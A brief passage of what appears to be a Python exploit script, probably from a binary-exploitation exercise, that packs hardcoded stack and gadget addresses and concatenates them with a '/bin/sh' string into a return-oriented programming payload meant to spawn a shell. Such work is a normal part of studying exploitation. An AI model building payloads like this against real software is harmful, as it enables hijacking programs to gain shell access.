...
a = (0x7ffffff68fc8).to_bytes(8, 'little')
#address for executing ROP gadget to call exec
b = (0x7ffffff68fd0).to_bytes(8, 'little')
#address for gadget instr, which helps to achieve ROP chain 
c = (0x0000000000401e70).to_bytes(8, 'little')

hacking = bin_sh_str + null_terminator + null_rdi + null_rsi + a + b + c
